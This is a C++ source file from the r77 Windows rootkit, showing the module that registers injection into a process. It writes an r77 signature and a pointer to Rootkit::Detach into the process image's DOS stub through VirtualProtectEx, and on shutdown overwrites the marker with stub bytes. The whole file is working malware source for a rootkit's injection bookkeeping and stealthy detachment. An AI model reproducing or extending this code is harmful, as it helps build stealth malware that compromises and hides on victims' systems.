#include "r77.h"

bool Register::Initialize()
{
	// Store the r77 header in the main module.
	LPBYTE module = (LPBYTE)GetModuleHandleW(NULL);
	if (module)
	{
		// The r77 header is written to the DOS stub.
		LPWORD signature = (LPWORD) & module[sizeof(IMAGE_DOS_HEADER)];

		// If this process already has an r77 signature, indicate that the DLL should be detached by returning false.
		if (*signature == R77_SIGNATURE || *signature == R77_SERVICE_SIGNATURE || *signature == R77_HELPER_SIGNATURE) return false;

		DWORD oldProtect;
		if (VirtualProtectEx(GetCurrentProcess(), module, 512, PAGE_READWRITE, &oldProtect))
		{
			// The current process is now marked as injected and therefore, cannot be injected again.
			*signature = R77_SIGNATURE;

			// Write a function pointer to Rootkit::Detach that can be invoked using NtCreateThreadEx to detach r77 from this process.
			*(PDWORD64)&module[sizeof(IMAGE_DOS_HEADER) + 2] = (DWORD64)Rootkit::Detach;

			VirtualProtectEx(GetCurrentProcess(), module, 512, oldProtect, &oldProtect);
		}
	}

	return true;
}
void Register::Shutdown()
{
	LPBYTE module = (LPBYTE)GetModuleHandleW(NULL);
	if (module)
	{
		DWORD oldProtect;
		if (VirtualProtectEx(GetCurrentProcess(), module, 512, PAGE_READWRITE, &oldProtect))
		{
			// Remove the r77 header by overwriting the DOS stub.
			// Even if this sequence of bytes doesn't match the original DOS stub, it does not affect the process.
			*(LPWORD)&module[sizeof(IMAGE_DOS_HEADER)] = 0x1f0e;
			*(PDWORD64)&module[sizeof(IMAGE_DOS_HEADER) + 2] = 0xb821cd09b4000eba;

			VirtualProtectEx(GetCurrentProcess(), module, 512, oldProtect, &oldProtect);
		}
	}
}